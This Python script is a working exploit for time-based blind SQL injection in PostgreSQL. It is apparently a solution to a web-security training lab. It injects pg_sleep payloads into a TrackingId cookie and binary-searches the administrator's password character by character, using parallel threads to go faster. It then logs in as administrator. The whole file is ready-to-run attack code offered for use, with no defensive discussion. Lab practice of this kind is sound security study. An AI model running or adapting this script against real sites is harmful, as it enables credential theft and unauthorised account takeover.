#!/usr/bin/env python3
# OPTIMIZED VERSION:
#   - binary search instead of linear search (for length and each character)
#   - parallel character extraction via thread pool
#
# These two changes drastically reduce the number of requests needed
# (and therefore the total time, since each "true" request costs ~delay
# seconds).

from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

cookie_name = 'TrackingId'
tracking_cookie = None
delay = 3

# Number of password positions to attack in parallel.
# Higher = faster, but too high can overload the target server and
# make timing measurements unreliable (false negatives).
MAX_WORKERS = 5


def new_session():
    """Create an independent HTTP session (one per thread is needed,
    because requests.Session cookie jars are not thread-safe)."""
    s = requests.Session()
    s.proxies = proxies
    s.verify = False
    return s


def get_tracking_cookie(client, host):
    global tracking_cookie
    r = client.get(host)
    if r.status_code != 200:
        raise RuntimeError('Unexpected return status received when obtaining tracking cookie')
    tracking_cookie = client.cookies.get(cookie_name)


def send_request(client, host, payload):
    """Unchanged from the original: injects the payload into the cookie
    and measures whether the response exceeds the delay threshold."""
    client.cookies.set(cookie_name, f'{tracking_cookie}{payload}', domain=f'{host[8:]}')
    r = client.get(host)
    return r.elapsed.total_seconds() > delay


def verify_structure(client, host):
    if not send_request(client, host, f"'||(SELECT pg_sleep({delay}))||'"):
        raise RuntimeError('Could not verify usage of PostgreSQL')
    print(f'[+]   DB is PostgreSQL')

    if not send_request(client, host, f"'||(SELECT pg_sleep({delay}) FROM users LIMIT 1)||'"):
        raise RuntimeError('Could not verify existence of users table')
    print(f'[+]   DB has users table')

    if not send_request(client, host, f"'||(SELECT pg_sleep({delay})||username||password FROM users LIMIT 1)||'"):
        raise RuntimeError('Could not verify existence of expected columns in users table')
    print(f'[+]   users table contains columns username and password')

    if not send_request(client, host, f"'||(SELECT pg_sleep({delay})||username||password FROM users WHERE username='administrator')||'"):
        raise RuntimeError('Could not verify existence of expected columns in users table')
    print(f'[+]   users table contains username administrator')


def get_password_length(client, host, max_len=50):
    """Binary search on the length: instead of asking 'is it exactly i?'
    for every i, we ask 'is it longer than mid?' and halve the range
    each time. ~6 requests instead of an average of ~25."""
    lo, hi = 0, max_len
    while lo < hi:
        mid = (lo + hi) // 2
        if send_request(client, host, f"'||(SELECT pg_sleep({delay}) FROM users WHERE username='administrator' AND LENGTH(password)>{mid})||'"):
            lo = mid + 1
        else:
            hi = mid
    return lo if lo > 0 else False


def get_char_binary(client, host, position):
    """Binary search on a single character, comparing its ASCII code
    instead of the character itself. This still works even though the
    useful range (digits + lowercase letters) isn't contiguous: binary
    search stays correct, some steps are just 'wasted' falling into the
    gap between '9' and 'a'.
    ~7 requests instead of an average of ~18 with linear scanning."""
    lo, hi = 48, 122  # '0' to 'z'
    while lo < hi:
        mid = (lo + hi) // 2
        payload = f"'||(SELECT pg_sleep({delay}) FROM users WHERE username='administrator' AND ASCII(SUBSTR(password,{position},1))>{mid})||'"
        if send_request(client, host, payload):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)


def extract_char_worker(host, position):
    """Function run by each thread: creates its own session, obtains
    its own tracking cookie, and finds the character at the given
    position. Each thread is independent of the others."""
    client = new_session()
    get_tracking_cookie(client, host)  # each thread needs its own valid cookie
    return position, get_char_binary(client, host, position)


def get_password(host, length):
    """Extracts all password characters in parallel using a thread
    pool. Each position is independent of the others, so there's no
    need to wait for one to finish before starting the next."""
    password_chars = [''] * length

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(extract_char_worker, host, i) for i in range(1, length + 1)]
        completed = 0
        for future in futures:
            position, char = future.result()
            password_chars[position - 1] = char
            completed += 1
            sys.stdout.write(f'\r[ ]   Extracted {completed}/{length} characters: ' + ''.join(password_chars))
            sys.stdout.flush()

    print()
    return ''.join(password_chars)


def login(host, password):
    def get_csrf_token(client, url):
        r = client.get(url)
        soup = BeautifulSoup(r.text, 'html.parser')
        return soup.find('input', attrs={'name': 'csrf'})['value']

    client = new_session()

    url = f"{host}/login"
    csrf = get_csrf_token(client, url)
    if not csrf:
        print(f'[-] Unable to obtain csrf token')
        sys.exit(-2)

    payload = {'csrf': csrf,
               'username': 'administrator',
               'password': password}
    r = client.post(url, data=payload, allow_redirects=True)
    return 'Your username is: administrator' in r.text


def main():
    print('[+] Blind SQL injection with time delays and information retrieval (optimized)')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Example: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    print(f'[ ] Attempting blind SQL injection with time delay, using {delay}s as threshold')

    client = new_session()

    get_tracking_cookie(client, host)
    print(f'[+] Obtained tracking cookie: {tracking_cookie}')

    print(f'[ ] Verify that structure of lab is as expected')
    verify_structure(client, host)

    print(f'[ ] Attempt to obtain password length (binary search)')
    password_length = get_password_length(client, host)
    if not password_length:
        print(f'[-] Failed to enumerate password length')
        sys.exit(-2)
    print(f'[+]   Found password length: {password_length}')

    print(f'[ ] Attempt to extract password (binary search, {MAX_WORKERS} parallel threads)')
    password = get_password(host, password_length)
    if not password:
        print(f'[-] Failed to extract password')
        sys.exit(-2)
    print(f'[+] Found password: {password}')

    print('[ ] Try to login as administrator')
    if login(host, password):
        print('[+] Login as administrator successful')
    else:
        print('[-] Failed to login as administrator')


if __name__ == '__main__':
    main()
